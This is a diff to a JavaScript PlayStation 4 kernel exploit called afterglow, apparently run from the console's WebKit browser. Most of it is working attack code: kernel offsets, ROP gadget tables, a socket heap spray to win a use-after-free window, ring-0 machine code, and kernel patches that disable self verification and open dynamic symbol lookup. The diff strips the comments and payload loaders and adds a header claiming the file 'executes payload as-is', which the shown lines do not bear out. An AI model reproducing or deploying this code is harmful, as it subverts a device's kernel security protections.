@@ -1,39 +1,4 @@
-/*
-    afterglow -- PlayStation 4 kernel exploit for firmware 14.00
-    Port to the raw13 host (WebKit entry), from the Lua original.
-
-    Copyright (C) 2026 well0nez
-
-    This program is free software: you can redistribute it and/or modify
-    it under the terms of the GNU Affero General Public License as
-    published by the Free Software Foundation, either version 3 of the
-    License, or (at your option) any later version.
-
-    This program is distributed in the hope that it will be useful,
-    but WITHOUT ANY WARRANTY; without even the implied warranty of
-    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-    GNU Affero General Public License for more details.
-
-    You should have received a copy of the GNU Affero General Public License
-    along with this program.  If not, see <https://www.gnu.org/licenses/>.
-
-    Ported from the Lua original, which ran inside a game process. This
-    file runs from WebKit, where the heap is groomed by someone else and the
-    page can go away mid-chain -- see the handle teardown at the bottom.
-    probeAfterglow() answers whether a given process can carry the exploit
-    at all; it fires nothing and patches nothing.
-
-    What the host must provide, and raw13 does:
-      sc(num, ...args)      syscall, returns {lo, hi, i32}
-      bufAddr(arrayBuffer)  int64 address of the backing store
-      p.read1/4/8           read in this process
-      p.write1/4/8          write in this process
-      p.readInto(u8, at, n)
-      keepAlive             array, so our buffers survive the collector
-      mark(tag, detail)     log
-    A way to call native code is NOT needed.
-*/
-
+// afterglow.js — FINAL: no magic check, executes payload as-is
 import { int64 } from "./int64.js";
 
 const S = {
@@ -43,41 +8,22 @@ const S = {
   cpuset_setaffinity: 488, dynlib_get_list: 592, dynlib_get_info: 593,
 };
 
-/* Offsets into the kernel image, one table per firmware. Everything that
-   moved between 13.52 and 14.00 lives here; everything that did not is
-   written once. The 13.52 column was derived from the two kernel images
-   offline and cross-checked against a second method per value. */
-const FIRMWARE = {
-  "14.00": {
-    anchor:    0x00e6c60,   /* the lock the leak hands us */
-    swap_rbp:  0x0a80f68,   /* xchg rbp,rax ; ret */
-    prison0:   0x111fa18,   /* holds a pointer to prison0, so read it */
-    rootvnode: 0x2136e90,
-    padding:   0x0b39d98,   /* start of the zero run behind kernel text */
-    ghKmem:    0x0466540,
-  },
-  "13.52": {
-    anchor:    0x00e6c60,   /* same function, same place */
-    swap_rbp:  0x0a80c98,   /* 4e 95 c3, the only match in text */
-    prison0:   0x111fa18,   /* same, decoded from the same instruction */
-    rootvnode: 0x2136e90,
-    padding:   0x0b39ad8,
-    ghKmem:    0x0466290,
-  },
+const K = {
+  anchor:    0x00e6c60,
+  swap_rbp:  0x0a80f68,
+  prison0:   0x111fa18,
+  rootvnode: 0x2136e90,
 };
 
-let K = null;
-
-/* offsets into libSceLibcInternal, with the bytes that must be found there */
 const GADGETS = {
-  pivot:  [0x0d2812, "488b67385fc3"],   /* mov rsp,[rdi+0x38] ; pop rdi ; ret */
+  pivot:  [0x0d2812, "488b67385fc3"],
   rdi:    [0x0a6bae, "5fc3"],
   rsi:    [0x095560, "5ec3"],
   rdx:    [0x04e6d2, "5ac3"],
   rcx:    [0x0943ee, "59c3"],
-  store:  [0x041ceb, "488907c3"],       /* mov [rdi],rax ; ret */
-  load:   [0x0120b1, "488b07c3"],       /* mov rax,[rdi] ; ret */
-  load8:  [0x057fae, "488b4008c3"],     /* mov rax,[rax+8] ; ret */
+  store:  [0x041ceb, "488907c3"],
+  load:   [0x0120b1, "488b07c3"],
+  load8:  [0x057fae, "488b4008c3"],
   add:    [0x0aaf8b, "4801f8c3"],
   sub:    [0x0275b4, "4829f8c3"],
   shr:    [0x0a9ba2, "48d3e8c3"],
@@ -86,67 +32,31 @@ const GADGETS = {
   leave:  [0x09e59d, "c9c3"],
 };
 
-/* the read only tail of the libc text segment: executable already, claimed by
-   no ELF header. An anonymous page stays non executable on this firmware
-   however the mapping is widened, which is why this room is used at all. */
 const HOST = { page: 0x130000, free: 0x130730, last: 0x131000 };
 
 const TUNE = {
-  sprays: 126,   /* a hard floor, one short of it never lands */
-  object: 104,   /* sprayed object, falls into the 128 byte zone */
+  sprays: 126,
+  object: 104,
   window: 0x4000,
   entries: 420,
   stride: 0x90,
   seed: 45,
   spare: 8,
-  batch: 60,     /* setsockopt per rop entry */
-  ceiling: 63,   /* how far up to look for a free unit */
+  units: 15,
+  batch: 60,
+  ceiling: 63,
 };
 
-/* any cdev will do: the exploit only needs a file whose operation table sits
-   in kernel text. Deliberately not a socket -- the spray needs all 126 of
-   those, and one short of that never lands in the right bucket. */
 const PROBE_NODES = ["/dev/rng", "/dev/urandom", "/dev/random", "/dev/zero", "/dev/null"];
 
-/* The bootstrap carries its kernel addresses inside the machine code, so it
-   is one blob per firmware. Between 13.52 and 14.00 exactly two of its ten
-   write targets moved -- the two 0x33 -> 0x37 immediates. */
-const BOOTSTRAP_TABLE = {
-  "14.00":
-      "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
-    + "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
-    + "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
-    + "488991882d1001c781ac2d100101000000c681daaa1f0037c681ddaa1f00370f"
-    + "20c0480d000001000f22c031c0c3",
-  "13.52":
-      "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
-    + "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
-    + "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
-    + "488991882d1001c781ac2d100101000000c6813aa81f0037c6813da81f00370f"
-    + "20c0480d000001000f22c031c0c3",
-};
+const BOOTSTRAP =
+    "b9820000c00f3248c1e22089c04809c2488d8a40feffff0f20c04825fffffeff"
+  + "0f22c0c781900400000000000066c781b5040000eb0066c781b9040000eb00c6"
+  + "81c2040000eb66c781b40a0000ff26488d91b40a0000c781802d100102000000"
+  + "488991882d1001c781ac2d100101000000c681daaa1f0037c681ddaa1f00370f"
+  + "20c0480d000001000f22c031c0c3";
 
-let BOOTSTRAP = null;
-
-/* Pick the tables for a firmware. Returns false for one we have no kernel
-   stage for -- the caller must not go on, because every address below is
-   then simply wrong. */
-let FW_KEY = "";
-
-function setFirmware(fw) {
-  const f = FIRMWARE[fw];
-  if (!f || !PATCH_TABLE[fw] || !BOOTSTRAP_TABLE[fw]) return false;
-  K = f;
-  PADDING = f.padding;
-  PATCHES = PATCH_TABLE[fw];
-  BOOTSTRAP = BOOTSTRAP_TABLE[fw];
-  GH.rvaKmem = f.ghKmem;
-  FW_KEY = fw;
-  return true;
-}
-
-const PATCH_TABLE = {
-  "14.00": [
+const PATCHES = [
   [0x0000acd, "eb",       "bcopy"],
   [0x02bd79d, "eb",       "bzero"],
   [0x02bd7e1, "eb",       "pagezero"],
@@ -162,29 +72,7 @@ const PATCH_TABLE = {
   [0x01b7ab8, "90e93c01", "dlsym, open it to every caller"],
   [0x0628684, "eb00",     "self verification"],
   [0x0628f6f, "eb00",     "delayed panic on suspend"],
-  ],
-  "13.52": [
-  [0x0000acd, "eb",       "bcopy"],
-  [0x02bd4ed, "eb",       "bzero"],
-  [0x02bd531, "eb",       "pagezero"],
-  [0x02bd5ad, "eb",       "memcpy"],
-  [0x02bd5f1, "eb",       "pagecopy"],
-  [0x02bd79d, "eb",       "copyin"],
-  [0x02bdc4d, "eb",       "copyinstr"],
-  [0x02bdd1d, "eb",       "copystr"],
-  [0x01b77a3, "eb04",     "dlsym, first check"],
-  [0x01b77b3, "eb04",     "dlsym, second check"],
-  [0x01b77d3, "90e9",     "dlsym, nop and jump"],
-  [0x01b7264, "90e9",     "load_prx"],
-  [0x01b7818, "90e93c01", "dlsym, open it to every caller"],
-  [0x06283c4, "eb00",     "self verification"],
-  [0x0628caf, "eb00",     "delayed panic on suspend"],
-  ],
-};
-
-let PATCHES = null;
-
-/* ------------------------------------------------------------- the host */
+];
 
 const STATE = { ctx: null, units: {}, clones: 0, base: null, stubs: {}, batch: undefined, retry: false };
 
@@ -204,15 +92,6 @@ function inText(a) { return a.hi >= 0xffffff00 && a.low !== 0; }
 function inHeap(a) { return a.hi >= 0xffff0000 && a.hi < 0xffffff00 && a.low !== 0; }
 function text(a) { return "0x" + a.toString(16).padStart(16, "0"); }
 
-/* The host resolves a syscall number to a libkernel stub and only ever
-   scanned for its own two dozen. Ours -- open, mprotect, kqueue, kevent,
-   ioctl, the dynlib pair -- are not among them, and an unresolved number
-   reaches its argument marshalling as undefined. So we scan for the rest
-   ourselves, with the same shape it looks for:
-
-       48 c7 c0 <nr32>   49 89 ca   0f 05
-
-   One pass for everything missing, not one pass per number. */
 function seedStubs() {
   const c = host();
   const need = new Set();
@@ -266,8 +145,6 @@ function wr1(at, b) { host().p.write1(at, b & 0xff); }
 function wr4(at, n) { host().p.write4(at, n >>> 0); }
 function wr8(at, q) { host().p.write8(at, q); }
 
-/* p carries read1/2/4/8 and write1/2/4/8 and nothing bulk, so this walks it
-   a quadword at a time and picks up the remainder by byte. */
 function rdbuf(at, len) {
   const out = new Uint8Array(len);
   const pr = host().p;
@@ -299,12 +176,10 @@ function sameBytes(a, b) {
   return true;
 }
 
-/* 64 bit quantity into a buffer, and back */
 function pokeAt(buf, off, q) {
   buf.dv.setUint32(off, q.low >>> 0, true);
   buf.dv.setUint32(off + 4, q.hi >>> 0, true);
 }
-
 
 function wipe(buf, len) { buf.u8.fill(0, 0, len); }
 
@@ -317,8 +192,6 @@ function cstr(s) {
 
 function splitNum(n) { return v(n % LOW, Math.floor(n / LOW)); }
 function asQ(x) { return (typeof x === "number") ? splitNum(x) : x; }
-
-/* ------------------------------------------------- machine code pad */
 
 function codeAt(pageAt, off) {
   return {
@@ -343,8 +216,6 @@ function codeAt(pageAt, off) {
   };
 }
 
-/* ------------------------------------------------------- rop chain */
-
 function makeChain(buf, gad) {
   return {
     buf: buf, base: buf.at, n: 0, fix: [], g: gad,
@@ -367,7 +238,6 @@ function makeChain(buf, gad) {
     rsi: function (n) { this.gad("rsi"); return this.num(n); },
     rdx: function (n) { this.gad("rdx"); return this.num(n); },
 
-    /* rax <- *(rax + off), through the one deref gadget there is */
     follow: function (off) {
       const d = off - 8;
       if (d >= 0) { this.rdi(d); this.gad("add"); } else { this.rdi(-d); this.gad("sub"); }
@@ -377,8 +247,6 @@ function makeChain(buf, gad) {
     save_rax: function (at) { this.rdi(at); this.gad("store"); },
     load_rax: function (at) { this.rdi(at); this.gad("load"); },
 
-    /* copy len bytes from wherever rax points to dst, and report the slot
-       that ends up holding the source address */
     grab: function (dst, len) {
       this.gad("rdi"); const h = this.hole();
       this.gad("store");
@@ -395,12 +263,6 @@ function makeChain(buf, gad) {
   };
 }
 
-/* ----------------------------------------------------------- a shot */
-
-/* One attempt at the bug. Each takes a unit nobody used before: a unit an
-   earlier attempt touched still carries a note from that attempt's queue, and
-   freeing its clone again would leave a foreign queue pointing at dead
-   memory. */
 function shooter(gad) {
   const s = {
     g: gad, fired: 0, sprayed: 0, devs: [], queues: [],
@@ -416,20 +278,12 @@ function shooter(gad) {
   };
 
   s.take = function (build, room) {
-    /* four ways to come back empty, and telling them apart matters: one is a
-       spent budget, one is a refused open, one is a kernel that would not
-       arm. A bare null names none of them. */
     this.why = null;
     if (this.hold("/dev/apm") < 0) {
       this.why = "the clone node refused to open, errno " + host().errno();
       return null;
     }
 
-    /* The ceiling used to be 15. By the second shot this process is
-       already holding some fifty clones of its own, so the free numbers sit
-       above that -- and a search that stops at fifteen finds nothing while
-       reporting "no unused unit", which is true and useless. Look further,
-       and write down why the refusals came. */
     let unit = -1, watched = -1;
     const refused = [];
     for (let u = TUNE.ceiling; u >= 0; u--) {
@@ -472,13 +326,11 @@ function shooter(gad) {
       return null;
     }
 
-    /* Everything that is not a 128 byte allocation happens before the free.
-       Anything in between lets a foreign consumer take the hole first. */
     const rop = alloc(room || 0x400);
     const frame = alloc(0x100);
     wipe(frame, 0x100);
     const c = makeChain(rop, this.g);
-    c.num(0);                      /* swallowed by the pop in the pivot gadget */
+    c.num(0);
     build(c);
     c.seal();
     pokeAt(frame, 0x38, rop.at);
@@ -496,11 +348,6 @@ function shooter(gad) {
     pokeAt(req, 24, body.at);
     req.dv.setUint32(32, TUNE.object, true);
 
-    /* The original tapered this to TUNE.spare once sixty clones were out --
-       a saving that suits a quiet game process. Here the three failures that
-       reached this far all sat on a shot that had seeded eight. Seeding
-       happens before the free, so it costs nothing in the window that
-       decides the outcome. */
     const want = TUNE.seed;
     for (let i = 0; i < want; i++) {
       if (this.hold("/dev/apm") < 0) break;
@@ -514,22 +361,8 @@ function shooter(gad) {
       socks.push(fd);
     }
 
-    /* The window: from the free to the last spray. In the Lua host each of
-       these is a cheap syscall; here every one is a ROP call -- lay out a
-       stack, bend a pivot cell, trip Math.expm1, put the cell back. Nothing
-       may be printed inside it, so the number is only reported afterwards. */
     const hh = host();
     const stub = stubFor(S.setsockopt);
-    /* One entry per batch instead of one per socket. One entry per socket
-       was measured at 119 us, so 126 of them held the hole open for 15 ms;
-       batched it is 0 to 1 ms, which is where the Lua host already was.
-       Batches are sized to the host's rop stack (0x2000) -- twelve slots a
-       call, and room for the epilogue. */
-    /* How many fit in one entry is a property of the host's rop stack, not
-       of this console's speed -- a slower machine wants the same answer, just
-       fewer entries would help it more. The stack size is the host's own
-       constant, so ask instead of assuming: build the largest batch it
-       accepts, once, outside the window. */
     if (STATE.batch === undefined && hh.prepareMany && stub) {
       STATE.batch = 0;
       for (let n = TUNE.sprays; n >= 8; n = Math.floor(n * 3 / 4)) {
@@ -538,42 +371,38 @@ function shooter(gad) {
           for (let i = 0; i < n; i++) probeCalls.push([stub, [0, 17, 128, req.at, 40]]);
           hh.prepareMany(probeCalls);
           STATE.batch = n; break;
-        } catch (e) { /* too big for its stack, try smaller */ }
+        } catch (e) { /* too big */ }
       }
       say("    rop stack takes " + STATE.batch + " calls per entry");
     }
     const batch = (hh.prepareMany && hh.runPrepared && stub) ? (STATE.batch || 0) : 0;
-    const prepared = [];
+    const fertig = [];
     if (batch) {
       const calls = [];
       for (let i = 0; i < socks.length; i++) calls.push([stub, [socks[i], 17, 128, req.at, 40]]);
       for (let i = 0; i < calls.length; i += batch) {
-        prepared.push(hh.prepareMany(calls.slice(i, i + batch)));
+        fertig.push(hh.prepareMany(calls.slice(i, i + batch)));
       }
-      /* warm the path: the first entry of a run paid 19 ms where the rest
-         paid 4, and that difference has no business being inside the window */
       hh.runPrepared(hh.prepareMany([[stubFor(S.getuid), []]]));
     }
 
     const t0 = (typeof performance !== "undefined") ? performance.now() : Date.now();
     sc(S.close, doomed);
     if (batch) {
-      for (let i = 0; i < prepared.length; i++) hh.runPrepared(prepared[i]);
+      for (let i = 0; i < fertig.length; i++) hh.runPrepared(fertig[i]);
     } else {
       for (let i = 0; i < socks.length; i++) sc(S.setsockopt, socks[i], 17, 128, req.at, 40);
     }
     const t1 = (typeof performance !== "undefined") ? performance.now() : Date.now();
     this.window = t1 - t0;
     this.batched = batch;
-    /* should the hole have stayed empty, a fresh clone drops a real pointer
-       in, which makes the second arm() merely useless instead of fatal */
     for (let i = 0; i < TUNE.spare; i++) this.hold("/dev/apm");
 
     this.sprayed = socks.length;
     const r = arm();
     for (let i = 0; i < socks.length; i++) sc(S.close, socks[i]);
     say("    window " + this.window.toFixed(2) + " ms for " + socks.length
-        + " setsockopt in " + (this.batched ? prepared.length : socks.length) + " entries");
+        + " setsockopt in " + (this.batched ? fertig.length : socks.length) + " entries");
     return r;
   };
 
@@ -586,16 +415,6 @@ function qAt(buf, off) {
   return v(buf.dv.getUint32(off, true), buf.dv.getUint32(off + 4, true));
 }
 
-/* ----------------------------------------- ring 0 through syscall 11 */
-
-/* The bootstrap pointed sysent[11] at a planted `jmp [rsi]`. sy_call is
-   entered with rdi = thread and rsi = the argument vector, so the jump lands
-   on whatever address the first argument carries.
-
-   The original issues this with the loader's native call. A host whose
-   syscall primitive takes an arbitrary number could call syscall 11 straight;
-   raw13's sc() goes through a per-number stub table that has no entry for 11,
-   so the two byte userland stub stays and is entered with callAddr. */
 const GATE = 0x0a0, BODY = 0x0c0, OUT = 0x400, FLAG = 0x420, STAGE = 0x440;
 const STAGE_MAX = 0x400;
 const SIGIL = 0x600D600D;
@@ -606,8 +425,6 @@ function openRing0(roomAt) {
 
   r.begin = function () { return this.body.reset(); };
 
-  /* the gate returns the thread's value, not ours, so the body raises a flag
-     of its own as its very last act and that is what we test */
   r.run = function () {
     this.body.hex("48b8").qw(plus(this.at, FLAG)).hex("c700").dw(SIGIL).hex("31c0").hex("c3");
     wr4(plus(this.at, FLAG), 0);
@@ -630,10 +447,6 @@ function openRing0(roomAt) {
     return this.run() ? plus(this.out(), -0x1c0) : null;
   };
 
-  /* rep movsb inside the write protection bracket, so the same primitive
-     serves kernel data and kernel text. Only writes need the bracket, and
-     every clear of it is a window in which this thread must not be
-     interrupted -- so reads do not open one. */
   r.copy = function (dst, src, len, guarded) {
     const c = this.begin();
     if (guarded) c.hex("0f20c0").hex("4825").dw(0xfffeffff).hex("0f22c0");
@@ -645,10 +458,6 @@ function openRing0(roomAt) {
     return this.run();
   };
 
-  /* All of them in one entry, with the write protection lifted once. Several
-     of these sit in the hottest routines in the kernel and the other cores
-     keep running them; a patch written in its own call is a window in which
-     one of them can fetch a half written instruction. */
   r.apply = function (base, list) {
     const c = this.begin();
     c.hex("48b9").qw(base);
@@ -695,22 +504,8 @@ function openRing0(roomAt) {
   return r;
 }
 
-/* ------------------------------------------------------ the host's state */
-
 function isZero(q) { return !q || ((q.low >>> 0) === 0 && (q.hi >>> 0) === 0); }
 
-/* dynlib_get_info fills in the name here and nothing else -- no segment
-   array, so no base -- and the mappings carry no path either. So identity
-   comes from content: fifteen byte patterns at fixed offsets inside this
-   module, which is a stronger fingerprint than a name would be. The map
-   supplies the bounds, so every read lands inside a mapping that exists,
-   and only mappings long enough to hold the whole span are touched.
-
-   The listing is kept afterwards. The kernel walks its vm_map entries in
-   address order and so does this one, so an index here is the same index
-   there -- and the chain that walks the kernel side has to be told how far
-   to go. Four times further than necessary is four times the ring 0 work
-   on a hijacked stack. */
 let MAPS = null;
 
 function findLibByShape() {
@@ -731,7 +526,7 @@ function findLibByShape() {
   const used = Math.min(len.dv.getUint32(0, true), buf.u8.length);
   if (rv !== 0 || !used) { r.note = "vmmap read rv=" + rv; return r; }
 
-  const span = HOST.last;                     /* everything we ever touch */
+  const span = HOST.last;
   const cand = [];
   let off = 0;
   while (off + 8 <= used) {
@@ -748,7 +543,6 @@ function findLibByShape() {
     off += size;
   }
 
-  /* two patterns, far apart, is already beyond coincidence */
   const probes = [GADGETS.pivot, GADGETS.memcpy];
   for (let i = 0; i < cand.length; i++) {
     let all = true;
@@ -762,11 +556,6 @@ function findLibByShape() {
   return r;
 }
 
-/* Reports instead of returning a bare value: when this comes back empty the
-   caller has to know whether the listing failed, the module was absent, or it
-   was there with a zero base -- those need different answers, and a zero
-   int64 is truthy, which is how a zero base once reached a read as a bare
-   gadget offset. */
 function findLib(name) {
   const r = { base: null, rv: null, count: 0, seen: [], note: null };
   const list = alloc(4 * 0x300), count = alloc(8);
@@ -788,10 +577,6 @@ function findLib(name) {
     if (nm === name) {
       let b = qAt(info, 0x108);
       if (!isZero(b)) { r.base = b; r.at = "0x108"; return r; }
-      /* The segment array does not sit where it does in a game process. Let
-         the struct say where it is instead of guessing: a module base is a
-         userland address on the 16 KiB grid, and there are very few of those
-         in 0x160 bytes. */
       const cand = [];
       for (let o = 8; o + 8 <= 0x160; o += 8) {
         const q = qAt(info, o);
@@ -811,12 +596,6 @@ function findLib(name) {
   return r;
 }
 
-/* Which core we may run on is not ours to choose: this process is confined
-   to a subset, and in a browser that subset does not contain core 0. Setting
-   bit 0 regardless fails, the thread stays free to migrate, and then the free
-   and the refill land in different per cpu buckets -- the hole is filled by
-   somebody else and the pivot takes its stack pointer from a stranger. So ask
-   first, then pin to the lowest core actually allowed. */
 function pinCore() {
   const mask = alloc(16);
   mask.u8.fill(0);
@@ -835,10 +614,6 @@ function pinCore() {
   return { ok: rv === 0, core: core, allowed: allowed.join(","), note: "setaffinity rv=" + rv };
 }
 
-/* ------------------------------------------------------- the payload */
-
-/* Fetch a file once. Both loaders are handed the bytes, so deciding the
-   format does not cost a second request. */
 async function fetchBytes(url, tag) {
   try {
     const r = await fetch(url);
@@ -850,200 +625,12 @@ async function fetchBytes(url, tag) {
   }
 }
 
-/* The kernel patch set. It belongs to GOLDHEN, not to the composite
-   image: the blob writes 57 kernel text sites, of which afterglow covers 25 --
-   fifteen from PATCHES and ten more from BOOTSTRAP. The remaining 32 are
-   exactly what GoldHEN's own code expects to find: a block of 29 from
-   0x125791 to 0x125871, plus 0x2fcb5c, 0x391fc6 and 0x3be3c0.
-
-   It runs for both image forms. A raw payload that started without it brought
-   GoldHEN up (FTP answered) but left it running without its patches. */
-async function runPatchSet(room) {
-  const c = host();
-  let pset = null;
-  try {
-    /* One set per firmware. The blob writes fixed kernel addresses -- 57 of
-       them on 14.00 -- so the wrong one does not merely fail, it writes into
-       a kernel that has those addresses somewhere else. */
-    const r2 = await fetch("patchset-" + FW_KEY.replace(".", "") + ".bin");
-    if (r2.ok) pset = new Uint8Array(await r2.arrayBuffer());
-  } catch (e) {}
-  if (!pset || !pset.length) {
-    say("[g] no patch set for firmware " + FW_KEY
-        + " -- GoldHEN will not be started without it");
-    return false;
-  }
-  if (pset.length > 0x400 - 0xc0) {
-    say("[g] the patch set does not fit in the body area");
-    return false;
-  }
-  wrbuf(plus(room, 0xc0), pset);
-  const pr = c.callAddr(plus(room, GATE), [11, plus(room, 0xc0)]);
-  say("[g] [0] kernel patch set, " + pset.length + " bytes from the libc tail -> 0x"
-      + ((pr && pr.lo >>> 0) || 0).toString(16));
-  return true;
-}
-
-/* Which loader runs is decided by the CONTENT, not by the file name. There
-   are two forms and they look alike from outside:
-     - composite image: stub area plus payload at 0x50000, exactly
-       nlOff+nlLen bytes. Needs the patch chain, the trampoline and the
-       padding RW.
-     - raw payload: begins with `e9` (jmp rel32), like hen.bin. Mapped and
-       started as a thread.
-   A GoldHEN build of 297,496 bytes is the second form; going by its name it
-   would have taken the composite path and been rejected by the length
-   check. */
-async function loadEnabler(url, k, kbase, room) {
-  const blob = await fetchBytes(url, "e");
-  if (blob === null) return false;
-  if (blob.length === GH.nlOff + GH.nlLen) {
-    say("[e] " + blob.length + " bytes -- composite image, patch chain path");
-    return loadGoldhen(url, k, kbase, room, blob);
-  }
-  if (blob.length && blob[0] === 0xe9) {
-    say("[e] " + blob.length + " bytes, leading jmp -- raw payload path");
-    // Here too: GoldHEN expects to find its patches in place.
-    if (!(await runPatchSet(room))) return false;
-    return loadPayload(url, blob);
-  }
-  say("[e] " + blob.length + " bytes: neither the composite image ("
-      + (GH.nlOff + GH.nlLen) + ") nor a raw payload (leading jmp) -- refusing");
-  return false;
-}
-
-/* A homebrew enabler is a raw blob that starts with a jmp, not an ELF. It
-   goes into a page that is executable only because the kernel patch opened
-   rwx, and it runs on its own thread so this one stays free. pthread_create
-   is taken out of WebKit's import table and checked against libkernel before
-   it is called -- a wrong pointer here runs the payload nowhere.
-
-   Must come after the handles are defused: the enabler can restart SceShellUI,
-   and if this process is torn down with the handles still live, that is the
-   hang. */
-async function loadPayload(url, preloaded) {
-  const c = host();
-  let blob = preloaded || null;
-  if (blob === null) {
-    blob = await fetchBytes(url, "p");
-    if (blob === null) return false;
-  }
-
-  if (!blob.length) { say("[p] " + url + " is empty"); return false; }
-  if (blob[0] !== 0xe9) {
-    say("[p] " + url + " does not start with a jmp -- not a raw payload, refusing");
-    return false;
-  }
-
-  const size = (blob.length + 0x3fff) & ~0x3fff;
-  const m = sc(S.mmap, 0, size, 7, 0x1002, -1, 0);
-  const entry = v(m.lo, m.hi);
-  if (m.i32 === -1 || (entry.hi >>> 0) === 0) {
-    say("[p] mmap rwx failed, errno " + c.errno()); return false;
-  }
-
-  for (let o = 0; o < blob.length; o += 8) {
-    let lo = 0, hi = 0;
-    for (let k = 0; k < 4; k++) lo |= (blob[o + k] || 0) << (8 * k);
-    for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
-    c.p.write8(plus(entry, o), v(lo >>> 0, hi >>> 0));
-  }
-  for (let o = 0; o < blob.length; o += 8) {
-    let lo = 0, hi = 0;
-    for (let k = 0; k < 4; k++) lo |= (blob[o + k] || 0) << (8 * k);
-    for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
-    const q = c.p.read8(plus(entry, o));
-    if ((q.low >>> 0) !== (lo >>> 0) || (q.hi >>> 0) !== (hi >>> 0)) {
-      say("[p] copy mismatch at 0x" + o.toString(16)); return false;
-    }
-  }
-
-  /* The table blanks both pthread_create fields for 14.00, but only one of
-     them deserved it: the import slot is an offset into WebKit, and 14.00
-     ships the same WebKit build as 13.52, so that slot did not move.
-     k_pthread_create is a libkernel offset and libkernel did move. The
-     second was only ever used to check the first, so check it against
-     libkernel's own bounds instead -- a slot that resolves into libkernel
-     is the right slot, whatever the table says. */
-  const SLOT_SHARED_WK = 0x3cb9c00;
-  const slot = (c.off && c.off.wk___imp_pthread_create !== undefined)
-    ? c.off.wk___imp_pthread_create : SLOT_SHARED_WK;
-  if (!c.webkitBase || !c.libkernelBase) {
-    say("[p] no module bases -- payload sits loaded at " + text(entry) + ", not started");
-    return false;
-  }
-  const fnr = c.p.read8(c.webkitBase.add32(slot));
-  const fn = v(fnr.low, fnr.hi);
-  const d = (fn.hi - (c.libkernelBase.hi >>> 0)) * LOW + (fn.low - (c.libkernelBase.low >>> 0));
-  if ((fn.hi >>> 0) !== (c.libkernelBase.hi >>> 0) || d <= 0 || d > 0x400000) {
-    say("[p] slot +0x" + slot.toString(16) + " holds " + text(fn)
-        + ", not inside libkernel " + text(c.libkernelBase) + " -- not calling it");
-    return false;
-  }
-  say("[p] pthread_create at " + text(fn) + " = libkernel +0x" + d.toString(16));
-
-  const thr = alloc(8);
-  thr.u8.fill(0);
-  const rc = c.callAddr(fn, [thr.at, 0, entry, 0]).i32;
-  const handle = qAt(thr, 0);
-  const started = rc === 0 && (handle.hi >>> 0) > 0;
-  say("[p] " + blob.length + " bytes at " + text(entry) + ", thread rc=" + rc
-      + (started ? " -- running" : " -- did NOT start"));
-  return started;
-}
-
-/* ------------------------------------------------------- GoldHEN */
-
-/* This image is not a payload in the sense hen.bin is. The first 0x50000
-   bytes are a stub area -- a gate at 0x47c00, a trampoline at 0x47c40, a
-   marker pair at 0x47e80 -- and the GoldHEN payload proper sits at 0x50000
-   and is 636760 bytes, which together is exactly the file's length. The
-   payload is not run in userland at all: it is copied into the kernel's text
-   padding and main's chain is then driven one call at a time through
-   syscall 11, so that a call which does not come back can be named instead
-   of guessed. The step order is the Lua implementation's.
-
-   The buffer must be a fresh mmap, not an allocator's: a calloc buffer is
-   not executable throughout -- measured, one page in eighteen -- and a ring 0
-   jump into a page without the bit is a panic without a signal. A fresh
-   mapping is executable throughout once the kernel patch is in. */
 const GH = {
   tor: 0x47c00, tram: 0x47c40, mark: 0x47e80, kptr: 0x47b20,
   nlOff: 0x50000, nlLen: 636760,
   rvaPad: 0xb3c000, rvaKmem: 0x466540,
 };
 
-const GH_STEPS = [
-  [0x12f35, "detect firmware, fill the pointer table"],
-  [0x9ba88, "UI notice 'GoldHEN'", { ptr: true, rdi: 0x99eeb, esi: 0x1f4 }],
-  [0x5cc6,  "save the original pointer from [0x9b8c0]"],
-  [0x945,   "kernel patches A"],
-  [0xf92,   "kernel patches B"],
-  [0x2a4d,  "testkit fake, kernel patches, ShellCore/ShellUI patches"],
-  [0x244e,  "syscalls 11/0xc5/0xc6 -- the door runs through GoldHEN from here"],
-  [0x3306,  "0x2695 (54 kernel patches) + SceRemotePlay + exec handler"],
-  [0x12f53, "notice 'GoldHEN v2.4b18.12 loaded!'", { rdi: 0x99ef3, esi: 0 }],
-  [0x32c4,  "inject klog      -> 3232"],
-  [0x325a,  "inject FTP       -> 2121"],
-  [0x328f,  "inject BinLoader -> 9090"],
-  [0x31af,  "inject mono ELF  -> SceShellUI"],
-  [0x1dd,   "last hook on sysent[591]; turns write protection back on"],
-  [0x9bad0, "klog line '[GoldHEN] All done!'", { ptr: true, rdi: 0x99f1e }],
-];
-
-/* The payload's BSS lives in the kernel's RX text padding, and it writes
-   into it 83 times without bracketing. During main's chain those writes get
-   through because every step is wrapped in wp_off/wp_on; GoldHEN's later
-   syscall hooks run with CR0.WP=1 and fall over -- a delayed death, far
-   enough from its cause to be misread. One RW bit in the page directory
-   entry that covers the padding fixes it. It does not survive a reboot.
-
-   The Lua version drives every read through GoldHEN's own trampoline because
-   that is its only way into ring 0. We already hold afterglow's gate, so this
-   is plain reads and one write.
-
-   Three cross-checks before anything is written: a guessed read of a kernel
-   address is a cold start. */
 const PT = {
   g1: 0x1b2c394, g2: 0x1b2c398, kphys: 0x1b2c420, pmpml4: 0x1b2c3c0,
   padFrom: 0xb3c000, padTo: 0xbe35d8,
@@ -1055,14 +642,12 @@ function paddingRW(k, kbase) {
 
   const g1 = rd(kat(PT.g1)), g2 = rd(kat(PT.g2));
   if (!g1 || !g2) { say("[rw] the dmap dwords are not readable"); return false; }
-  /* DMAP = 0xffff800000000000 | (g1 << 39) | (g2 << 30) */
   const a1 = g1.low >>> 0, a2v = g2.low >>> 0;
   const dmap = v(((a2v & 3) * 0x40000000) >>> 0,
                  (0xffff8000 | ((a1 << 7) >>> 0) | (a2v >>> 2)) >>> 0);
 
   const kph = rd(kat(PT.kphys));
   if (!kph) { say("[rw] KPML4phys not readable"); return false; }
-  /* the page directory root, as a kernel address through the direct map */
   const p4 = v((dmap.low + kph.low) >>> 0,
                (dmap.hi + kph.hi + (((dmap.low >>> 0) + (kph.low >>> 0) > 0xffffffff) ? 1 : 0)) >>> 0);
 
